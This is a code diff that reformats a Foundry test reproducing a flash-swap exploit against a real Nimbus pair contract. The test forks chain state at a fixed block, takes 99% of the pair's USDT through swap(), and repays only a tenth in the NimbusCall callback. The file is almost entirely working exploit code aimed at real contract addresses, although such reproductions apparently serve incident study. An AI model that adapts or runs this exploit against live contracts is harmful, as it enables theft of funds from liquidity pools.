@@ -5,7 +5,7 @@ import "forge-std/Test.sol";
 import "./interface.sol";
 
 interface IERC20Custom {
-    function transfer(address, uint) external;
+    function transfer(address, uint256) external;
 }
 
 /*
@@ -20,28 +20,24 @@ interface IERC20Custom {
 
 */
 contract ContractTest is DSTest {
+    address public pair = 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1;
+    address public usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
-  address public pair = 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1;
-  address public usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
-  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    function setUp() public {
+        cheats.createSelectFork("mainnet", 13_225_516); //fork bsc at block 13225516
+    }
 
-  function setUp() public {
-    cheats.createSelectFork("mainnet", 13225516); //fork bsc at block 13225516
-    
-  }
+    function testExploit() public {
+        console.log("Before exploiting", IERC20(usdt).balanceOf(address(this)));
 
-  function testExploit() public {
-    console.log("Before exploiting",IERC20(usdt).balanceOf(address(this)));
+        uint256 amount = IERC20(usdt).balanceOf(pair) * 99 / 100;
+        IUniswapV2Pair(pair).swap(amount, 0, address(this), abi.encodePacked(amount));
 
-    uint256 amount = IERC20(usdt).balanceOf(pair) * 99 / 100;
-    IUniswapV2Pair(pair).swap(amount, 0, address(this), abi.encodePacked(amount));
+        console.log("After exploiting", IERC20(usdt).balanceOf(address(this)));
+    }
 
-    console.log("After exploiting",IERC20(usdt).balanceOf(address(this)));
-  }
-
-  function NimbusCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
-
-    IERC20Custom(usdt).transfer(pair, amount0/10 );
-
+    function NimbusCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        IERC20Custom(usdt).transfer(pair, amount0 / 10);
     }
 }
